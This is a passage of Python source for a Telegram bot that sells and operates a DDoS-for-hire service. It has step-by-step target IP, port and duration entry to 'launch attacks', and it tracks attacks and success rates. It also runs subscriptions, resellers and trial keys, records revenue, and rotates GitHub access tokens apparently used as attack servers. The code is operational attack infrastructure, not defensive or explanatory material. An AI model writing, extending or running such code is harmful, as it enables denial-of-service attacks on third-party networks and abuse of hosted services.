        f"📊 **Status:** {'🟢 Ready' if len(current_attacks) == 0 else '🔴 Busy'}\n\n"
        f"Use the buttons below:"
    )
    reply_markup = get_main_keyboard(user_id)
    await update.message.reply_text(message, reply_markup=reply_markup)
    log_activity(user_id, "start_command", "User started bot")
async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    if is_user_banned(user_id) and text != "❓ Help":
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT ban_reason FROM users WHERE user_id = ?', (user_id,))
        reason = cursor.fetchone()
        conn.close()
        await update.message.reply_text(
            f"🚫 **YOU ARE BANNED**\n"
            f"Reason: {reason[0] if reason else 'No reason provided'}"
        )
        return
    if text == "« Back to Main Menu":
        await start(update, context)
        return
    if text == "❌ Cancel":
        if user_id in temp_data:
            del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text("❌ **OPERATION CANCELLED**", reply_markup=reply_markup)
        return
    if text == "🎯 Launch Attack":
        await launch_attack_start(update, context, user_id)
    elif text == "📊 Check Status":
        await check_status(update, user_id)
    elif text == "🛑 Stop Attack":
        await stop_attack_handler(update, context, user_id)
    elif text == "📜 Attack History":
        await show_attack_history(update, user_id)
    elif text == "🎁 Referral System":
        await show_referral_system(update, user_id)
    elif text == "📝 My Profile":
        await show_my_profile(update, user_id)
    elif text == "👥 User Management":
        await show_user_management(update, user_id)
    elif text == "➕ Add User":
        await add_user_start(update, user_id)
    elif text == "➖ Remove User":
        await remove_user_start(update, user_id)
    elif text == "🔍 Search Users":
        await search_users_start(update, user_id)
    elif text == "🚫 Ban User":
        await ban_user_start(update, user_id)
    elif text == "✅ Unban User":
        await unban_user_start(update, user_id)
    elif text == "📋 Users List":
        await show_users_list(update, user_id)
    elif text == "⏳ Pending Requests":
        await show_pending_requests(update, user_id)
    elif text == "🔑 Generate Trial":
        await generate_trial_start(update, user_id)
    elif text == "📤 Export Users":
        await export_users_handler(update, user_id)
    elif text == "📥 Import Users":
        await import_users_start(update, user_id)
    elif text == "⚙️ Bot Settings":
        await show_bot_settings(update, user_id)
    elif text == "🔧 Toggle Maintenance":
        await toggle_maintenance(update, user_id)
    elif text == "🎨 Attack Methods":
        await show_attack_methods(update, user_id)
    elif text == "👑 Owner Panel":
        await show_owner_panel(update, user_id)
    elif text == "💾 Backup Database":
        await backup_database_handler(update, user_id)
    elif text == "♻️ Restore Database":
        await restore_database_start(update, user_id)
    elif text == "💵 Revenue Report":
        await show_revenue_report(update, user_id)
    elif text == "🎯 Set User Limit":
        await set_user_limit_start(update, user_id)
    elif text == "📢 Broadcast":
        await broadcast_start(update, user_id)
    elif text == "📤 Upload Binary":
        await upload_binary_start(update, user_id)
    elif text == "👑 Add Owner":
        await add_owner_start(update, user_id)
    elif text == "🗑️ Remove Owner":
        await remove_owner_start(update, user_id)
    elif text == "💰 Add Reseller":
        await add_reseller_start(update, user_id)
    elif text == "💰 Resellers List":
        await show_resellers_list(update, user_id)
    elif text == "📋 Owners List":
        await show_owners_list(update, user_id)
    elif text == "⏱️ Set Cooldown":
        await set_cooldown_start(update, user_id)
    elif text == "🎯 Set Max Attacks":
        await set_max_attacks_start(update, user_id)
    elif text == "🚀 Max Concurrent":
        await set_max_concurrent_start(update, user_id)
    elif text == "🚫 Auto-Ban Threshold":
        await set_auto_ban_start(update, user_id)
    elif text == "💬 Welcome Message":
        await set_welcome_message_start(update, user_id)
    elif text == "⏰ Rate Limit":
        await set_rate_limit_start(update, user_id)
    elif text == "🎁 Referral Bonus":
        await set_referral_bonus_start(update, user_id)
    elif text == "🧹 Cleanup Settings":
        await show_cleanup_settings(update, user_id)
    elif text == "🔑 Token Management":
        await show_token_management(update, user_id)
    elif text == "➕ Add Token":
        await add_token_start(update, user_id)
    elif text == "📋 List Tokens":
        await list_tokens_handler(update, user_id)
    elif text == "🗑️ Remove Token":
        await remove_token_start(update, user_id)
    elif text == "🏥 Check Health":
        await check_token_health_handler(update, user_id)
    elif text == "📊 Token Statistics":
        await show_token_statistics(update, user_id)
    elif text == "🔄 Auto-Rotate":
        await auto_rotate_tokens_handler(update, user_id)
    elif text == "⭐ Set Priority":
        await set_token_priority_start(update, user_id)
    elif text == "🧹 Remove Expired":
        await remove_expired_tokens_handler(update, user_id)
    elif text == "📈 Statistics":
        await show_statistics_menu(update, user_id)
    elif text == "📊 Attack Stats":
        await show_attack_statistics(update, user_id)
    elif text == "👥 User Stats":
        await show_user_statistics(update, user_id)
    elif text == "📋 Activity Logs":
        await show_activity_logs(update, user_id)
    elif text == "❓ Help":
        await show_help(update, user_id)
    else:
        await handle_text_input(update, context, user_id, text)
async def launch_attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message)
        return
    tokens = get_all_tokens()
    if not tokens:
        await update.message.reply_text("❌ **NO SERVERS AVAILABLE**\nNo servers available. Contact admin.")
        return
    temp_data[user_id] = {"step": "attack_ip"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🎯 **LAUNCH ATTACK - STEP 1/4**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send target IP address:\n\n"
        "Example: `192.168.1.1`",
        reply_markup=reply_markup
    )
async def check_status(update: Update, user_id):
    if not current_attacks:
        await update.message.reply_text(
            "✅ **NO ACTIVE ATTACKS**\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "No attacks currently running.\n"
            "You can start a new attack."
        )
        return
    message = "🔥 **ACTIVE ATTACKS**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for attack_id, attack in current_attacks.items():
        elapsed = int(time.time() - attack['start_time'])
        remaining = max(0, int(attack['estimated_end_time'] - time.time()))
        message += (
            f"🆔 Attack #{attack_id}\n"
            f"🌐 Target: `{attack['ip']}:{attack['port']}`\n"
            f"⚡ Method: {attack['method']}\n"
            f"⏱️ Elapsed: {elapsed}s\n"
            f"⏳ Remaining: {remaining}s\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
        )
    await update.message.reply_text(message)
async def stop_attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    if not current_attacks:
        await update.message.reply_text("❌ **NO ACTIVE ATTACKS**\nNo attacks to stop.")
        return
    keyboard = []
    for attack_id, attack in current_attacks.items():
        keyboard.append([InlineKeyboardButton(
            f"Stop Attack #{attack_id} ({attack['ip']}:{attack['port']})",
            callback_data=f"stop_attack_{attack_id}"
        )])
    keyboard.append([InlineKeyboardButton("Stop All Attacks", callback_data="stop_all_attacks")])
    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Select attack to stop:", reply_markup=reply_markup)
async def show_attack_history(update: Update, user_id):
    history = get_user_attack_history(user_id, 10)
    if not history:
        await update.message.reply_text("📜 **NO ATTACK HISTORY**\nYou haven't performed any attacks yet.")
        return
    message = "📜 **YOUR ATTACK HISTORY**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, (ip, port, duration, method, start_time, status, success_rate) in enumerate(history, 1):
        date = datetime.fromtimestamp(start_time).strftime("%Y-%m-%d %H:%M")
        message += (
            f"{i}. **Attack on {date}**\n"
            f"   🌐 Target: `{ip}:{port}`\n"
            f"   ⚡ Method: {method}\n"
            f"   ⏱️ Duration: {duration}s\n"
            f"   📊 Status: {status}\n"
            f"   ✅ Success: {success_rate:.1f}%\n\n"
        )
    await update.message.reply_text(message)
async def show_referral_system(update: Update, user_id):
    stats = get_referral_stats(user_id)
    bonus_days = get_setting('referral_bonus_days', '3')
    message = (
        f"🎁 **REFERRAL SYSTEM**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📝 **Your Referral Code:**\n`{stats['referral_code']}`\n\n"
        f"📊 **Your Stats:**\n"
        f"• Total Referrals: {stats['total_referrals']}\n"
        f"• Bonus Days Earned: {stats['bonus_days_earned']}\n\n"
        f"💡 **How it works:**\n"
        f"Share your referral code with friends.\n"
        f"When they use your code, you get {bonus_days} bonus days!\n\n"
        f"To use a referral code, send:\n"
        f"`/redeem CODE`"
    )
    await update.message.reply_text(message)
async def show_my_profile(update: Update, user_id):
    user_info = get_user_info(user_id)
    if not user_info:
        await update.message.reply_text("❌ **USER NOT FOUND**")
        return
    (uid, username, role, expiry, banned, ban_reason, added_by, added_date, 
     custom_limit, failed_attacks, ref_code, referred_by, total_attacks) = user_info
    role_display = {
        'primary_owner': '👑 PRIMARY OWNER',
        'owner': '👑 OWNER',
        'limited_owner': '👑 LIMITED OWNER',
        'admin': '🛡️ ADMIN',
        'reseller': '💰 RESELLER',
        'user': '👤 USER'
    }.get(role, '👤 USER')
    if expiry == "LIFETIME":
        expiry_display = "♾️ Lifetime"
    else:
        try:
            expiry_time = float(expiry)
            expiry_date = datetime.fromtimestamp(expiry_time).strftime("%Y-%m-%d %H:%M")
            expiry_display = expiry_date
        except:
            expiry_display = "Unknown"
    user_limit = get_user_attack_limit(user_id)
    remaining = user_limit - total_attacks
    message = (
        f"📝 **YOUR PROFILE**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 **Username:** @{username}\n"
        f"🆔 **User ID:** `{uid}`\n"
        f"🏆 **Role:** {role_display}\n"
        f"📅 **Expires:** {expiry_display}\n"
        f"🎯 **Attack Limit:** {user_limit}\n"
        f"✅ **Attacks Used:** {total_attacks}\n"
        f"📊 **Remaining:** {remaining}\n"
        f"❌ **Failed Attacks:** {failed_attacks}\n"
        f"🎁 **Referral Code:** `{ref_code}`\n"
        f"📆 **Joined:** {added_date}"
    )
    if banned:
        message += f"\n\n🚫 **BANNED**\nReason: {ban_reason or 'No reason'}"
    await update.message.reply_text(message)
async def show_user_management(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    message = (
        "👥 **USER MANAGEMENT**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Manage users, approvals, and more\n\n"
        "Select an option below:"
    )
    reply_markup = get_user_management_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)
async def add_user_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "add_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "➕ **ADD USER - STEP 1/2**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to add:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )
async def remove_user_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "remove_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "➖ **REMOVE USER**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to remove:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )
async def search_users_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "search_users"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🔍 **SEARCH USERS**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send user ID or username to search:\n\n"
        "Example: `123456789` or `john`",
        reply_markup=reply_markup
    )
async def ban_user_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "ban_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🚫 **BAN USER - STEP 1/2**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to ban:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )
async def unban_user_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "unban_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "✅ **UNBAN USER**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to unban:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )
async def show_users_list(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, username, role, total_attacks, banned FROM users LIMIT 50')
    users = cursor.fetchall()
    conn.close()
    if not users:
        await update.message.reply_text("📭 **NO USERS FOUND**")
        return
    message = "📋 **USERS LIST** (First 50)\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, uname, role, attacks, banned in users:
        ban_icon = "🚫" if banned else "✅"
        message += f"{ban_icon} `{uid}` - @{uname} ({role}) - {attacks} attacks\n"
    await update.message.reply_text(message)
async def show_pending_requests(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, username, request_date FROM pending_users')
    pending = cursor.fetchall()
    conn.close()
    if not pending:
        await update.message.reply_text("✅ **NO PENDING REQUESTS**")
        return
    message = "⏳ **PENDING REQUESTS**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, uname, req_date in pending:
        message += f"• `{uid}` - @{uname}\n  Requested: {req_date}\n\n"
    await update.message.reply_text(message)
async def generate_trial_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    keyboard = [
        [InlineKeyboardButton("6 Hours", callback_data="trial_6"),
         InlineKeyboardButton("12 Hours", callback_data="trial_12"),
         InlineKeyboardButton("24 Hours", callback_data="trial_24")],
        [InlineKeyboardButton("48 Hours", callback_data="trial_48"),
         InlineKeyboardButton("72 Hours", callback_data="trial_72")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔑 **GENERATE TRIAL KEY**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Select trial duration:",
        reply_markup=reply_markup
    )
async def export_users_handler(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    await update.message.reply_text("📤 **EXPORTING USERS...**")
    try:
        filename = export_users_csv()
        with open(filename, 'rb') as f:
            await update.message.reply_document(document=f, filename=filename)
        os.remove(filename)
        log_activity(user_id, "export_users", f"Exported users to {filename}")
    except Exception as e:
        await update.message.reply_text(f"❌ **ERROR**\n{str(e)}")
async def import_users_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "import_users"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "📥 **IMPORT USERS**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send CSV file with columns:\n"
        "UserID, Username, Role, Expiry\n\n"
        "Example format:\n"
        "123456789,john,user,LIFETIME",
        reply_markup=reply_markup
    )
async def show_bot_settings(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    maintenance = int(get_setting('maintenance_mode', '0'))
    cooldown = get_setting('cooldown_duration', '40')
    max_attacks = get_setting('max_attacks', '40')
    max_concurrent = get_setting('max_concurrent_attacks', '3')
    auto_ban = get_setting('auto_ban_threshold', '5')
    message = (
        f"⚙️ **BOT SETTINGS**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔧 Maintenance: {'ON' if maintenance else 'OFF'}\n"
        f"⏱️ Cooldown: {cooldown}s\n"
        f"🎯 Max Attacks: {max_attacks}\n"
        f"🚀 Max Concurrent: {max_concurrent}\n"
        f"🚫 Auto-Ban Threshold: {auto_ban}\n\n"
        f"Select an option to modify:"
    )
    reply_markup = get_bot_settings_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)
async def toggle_maintenance(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    current = int(get_setting('maintenance_mode', '0'))
    new_value = 0 if current else 1
    set_setting('maintenance_mode', str(new_value))
    status = "ENABLED" if new_value else "DISABLED"
    await update.message.reply_text(f"✅ **MAINTENANCE MODE {status}**")
    log_activity(user_id, "toggle_maintenance", f"Set to {status}")
async def show_attack_methods(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    message = "🎨 **AVAILABLE ATTACK METHODS**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, method in enumerate(ATTACK_METHODS, 1):
        message += f"{i}. {method}\n"
    await update.message.reply_text(message)
async def show_owner_panel(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    message = (
        "👑 **OWNER PANEL**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Owner-only management options\n\n"
        "Select an option below:"
    )
    reply_markup = get_owner_panel_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)
async def backup_database_handler(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    await update.message.reply_text("💾 **CREATING BACKUP...**")
    try:
        backup_file = backup_database()
        with open(backup_file, 'rb') as f:
            await update.message.reply_document(document=f, filename=backup_file)
        os.remove(backup_file)
        log_activity(user_id, "backup_database", f"Created backup: {backup_file}")
        await update.message.reply_text("✅ **BACKUP COMPLETED**")
    except Exception as e:
        await update.message.reply_text(f"❌ **ERROR**\n{str(e)}")
async def show_revenue_report(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT SUM(amount) FROM revenue')
    total = cursor.fetchone()[0] or 0
    cursor.execute('SELECT transaction_type, SUM(amount) FROM revenue GROUP BY transaction_type')
    breakdown = cursor.fetchall()
    cursor.execute('SELECT date, SUM(amount) FROM revenue GROUP BY date ORDER BY date DESC LIMIT 7')
    recent = cursor.fetchall()
    conn.close()
    message = f"💵 **REVENUE REPORT**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    message += f"💰 **Total Revenue:** ${total:.2f}\n\n"
    if breakdown:
        message += "📊 **Breakdown by Type:**\n"
        for trans_type, amount in breakdown:
            message += f"• {trans_type}: ${amount:.2f}\n"
        message += "\n"
    if recent:
        message += "📅 **Recent 7 Days:**\n"
        for date, amount in recent:
            message += f"• {date}: ${amount:.2f}\n"
    await update.message.reply_text(message)
async def set_user_limit_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "set_limit_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🎯 **SET USER LIMIT - STEP 1/2**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )
async def show_token_management(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    tokens = get_all_tokens()
    message = (
        f"🔑 **TOKEN MANAGEMENT**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Total Servers: {len(tokens)}\n\n"
        f"Select an option below:"
    )
    reply_markup = get_token_management_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)
async def add_token_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "add_token"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "➕ **ADD TOKEN**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Send GitHub personal access token:\n\n"
        "Example: `ghp_xxxxxxxxxxxx`",
        reply_markup=reply_markup
    )
async def list_tokens_handler(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    tokens = get_all_tokens()
    if not tokens:
        await update.message.reply_text("📭 **NO TOKENS FOUND**")
        return
    message = "📋 **TOKENS LIST**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, token in enumerate(tokens, 1):
        (token_id, token_str, username, repo, added_date, status, 
         health_score, total_attacks, last_used, priority) = token
        health_icon = "🟢" if health_score > 80 else "🟡" if health_score > 50 else "🔴"
        message += (
            f"{i}. {health_icon} **{username}**\n"
            f"   Repo: {repo}\n"
            f"   Health: {health_score}%\n"
            f"   Attacks: {total_attacks}\n"
            f"   Priority: {priority}\n\n"
        )
    await update.message.reply_text(message)
async def check_token_health_handler(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    await update.message.reply_text("🏥 **CHECKING TOKEN HEALTH...**")
    healthy, unhealthy = check_token_health()
    await update.message.reply_text(
        f"✅ **HEALTH CHECK COMPLETED**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Healthy: {healthy}\n"
        f"🔴 Unhealthy: {unhealthy}"
    )
    log_activity(user_id, "check_token_health", f"Healthy: {healthy}, Unhealthy: {unhealthy}")
async def show_token_statistics(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    stats = get_token_statistics()
    if not stats:
        await update.message.reply_text("📭 **NO TOKEN DATA**")
        return
    message = "📊 **TOKEN STATISTICS**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for username, repo, total_attacks, health, priority, last_used in stats[:10]:
        last_used_str = "Never" if not last_used else datetime.fromtimestamp(last_used).strftime("%Y-%m-%d %H:%M")
        message += (
            f"**{username}**\n"
            f"• Attacks: {total_attacks}\n"
            f"• Health: {health}%\n"
            f"• Priority: {priority}\n"
            f"• Last Used: {last_used_str}\n\n"
        )
    await update.message.reply_text(message)
async def show_statistics_menu(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    message = (
        "📈 **STATISTICS & ANALYTICS**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "View detailed statistics\n\n"
        "Select an option below:"
    )
    reply_markup = get_statistics_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)
async def show_attack_statistics(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    stats = get_attack_statistics()
    message = (
        f"📊 **ATTACK STATISTICS**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 Total Attacks: {stats['total_attacks']}\n"
        f"✅ Successful: {stats['successful_attacks']}\n"
        f"📈 Success Rate: {stats['avg_success_rate']:.1f}%\n\n"
    )
    if stats['top_users']:
        message += "🔥 **Top Users:**\n"
        for username, count in stats['top_users']:
            message += f"• @{username}: {count} attacks\n"
    await update.message.reply_text(message)
async def show_user_statistics(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM users')
    total_users = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM users WHERE role = "user"')
    regular_users = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM users WHERE role IN ("owner", "primary_owner", "limited_owner")')
    owners = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM users WHERE role = "admin"')
    admins = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM users WHERE banned = 1')
    banned = cursor.fetchone()[0]
    conn.close()
    message = (
        f"👥 **USER STATISTICS**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 Total Users: {total_users}\n"
        f"👤 Regular Users: {regular_users}\n"
        f"👑 Owners: {owners}\n"
        f"🛡️ Admins: {admins}\n"
        f"🚫 Banned: {banned}"
    )
    await update.message.reply_text(message)
async def show_activity_logs(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT u.username, a.action, a.details, a.timestamp
        FROM activity_logs a
        JOIN users u ON a.user_id = u.user_id
        ORDER BY a.timestamp DESC
        LIMIT 20
    ''')
    logs = cursor.fetchall()
    conn.close()
    if not logs:
        await update.message.reply_text("📭 **NO ACTIVITY LOGS**")
        return
    message = "📋 **RECENT ACTIVITY LOGS**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for username, action, details, timestamp in logs:
        time_str = datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M")
        message += f"• **@{username}** - {action}\n  {time_str}\n"
        if details:
            message += f"  Details: {details[:50]}\n"
        message += "\n"
    await update.message.reply_text(message)
async def show_help(update: Update, user_id):
    message = (
        "❓ **HELP - AVAILABLE FEATURES**\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "**For All Users:**\n"
        "• Launch Attack - Start new attack\n"
        "• Check Status - View active attacks\n"
        "• Stop Attack - Stop running attack\n"
        "• Attack History - View past attacks\n"
        "• Referral System - Earn bonus days\n"
        "• My Profile - View your info\n\n"
    )
    if is_owner(user_id) or is_admin(user_id):
        message += (
            "**Admin Features:**\n"
            "• User Management - Manage users\n"
            "• Bot Settings - Configure bot\n"
            "• Statistics - View analytics\n"
            "• Activity Logs - View user actions\n\n"
        )
    if is_owner(user_id):
        message += (
            "**Owner Features:**\n"
            "• Owner Panel - Advanced management\n"
            "• Token Management - Manage servers\n"
            "• Revenue Report - Financial tracking\n"
            "• Backup/Restore - Data management\n\n"
        )
    message += "Need help? Contact admin."
    await update.message.reply_text(message)
async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id, text):
    if user_id not in temp_data:
        return
    step = temp_data[user_id].get("step")
    if step == "attack_ip":
        ip = text.strip()
        temp_data[user_id] = {"step": "attack_port", "ip": ip}
        await update.message.reply_text(
            f"🎯 **LAUNCH ATTACK - STEP 2/4**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ IP: `{ip}`\n\n"
            f"Send target PORT:\n\nExample: `80` or `443`"
        )
    elif step == "attack_port":
        try:
            port = int(text.strip())
            if port <= 0 or port > 65535:
                await update.message.reply_text("❌ Invalid port. Send a port between 1-65535:")
                return
            temp_data[user_id]["port"] = port
            temp_data[user_id]["step"] = "attack_duration"
            keyboard = [
                [InlineKeyboardButton("30s", callback_data="duration_30"),
                 InlineKeyboardButton("60s", callback_data="duration_60"),
                 InlineKeyboardButton("120s", callback_data="duration_120")],
                [InlineKeyboardButton("180s", callback_data="duration_180"),
                 InlineKeyboardButton("300s", callback_data="duration_300")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                f"🎯 **LAUNCH ATTACK - STEP 3/4**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ IP: `{temp_data[user_id]['ip']}`\n"
                f"✅ Port: `{port}`\n\n"
                f"Select duration:",
                reply_markup=reply_markup
            )
        except ValueError:
            await update.message.reply_text("❌ Invalid port. Send a number:")
    elif step == "add_user_id":
        try:
            new_user_id = int(text.strip())
            temp_data[user_id]["new_user_id"] = new_user_id
            temp_data[user_id]["step"] = "add_user_days"
            keyboard = [
                [InlineKeyboardButton("1 Day", callback_data="days_1"),
                 InlineKeyboardButton("7 Days", callback_data="days_7"),
                 InlineKeyboardButton("30 Days", callback_data="days_30")],
                [InlineKeyboardButton("Lifetime", callback_data="days_0"),
                 InlineKeyboardButton("Custom", callback_data="days_custom")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                f"➕ **ADD USER - STEP 2/2**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{new_user_id}`\n\n"
                f"Select duration:",
                reply_markup=reply_markup
            )
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID. Send a number:")
    elif step == "remove_user_id":
        try:
            remove_user_id = int(text.strip())
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute('DELETE FROM users WHERE user_id = ? AND role = "user"', (remove_user_id,))
            cursor.execute('DELETE FROM pending_users WHERE user_id = ?', (remove_user_id,))
            conn.commit()
            conn.close()
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **USER REMOVED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"User ID: `{remove_user_id}`",
                reply_markup=reply_markup
            )
            log_activity(user_id, "remove_user", f"Removed user {remove_user_id}")
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID. Send a number:")
    elif step == "search_users":
        query = text.strip()
        results = search_users(query)
        del temp_data[user_id]
        if not results:
            await update.message.reply_text("🔍 **NO USERS FOUND**")
            return
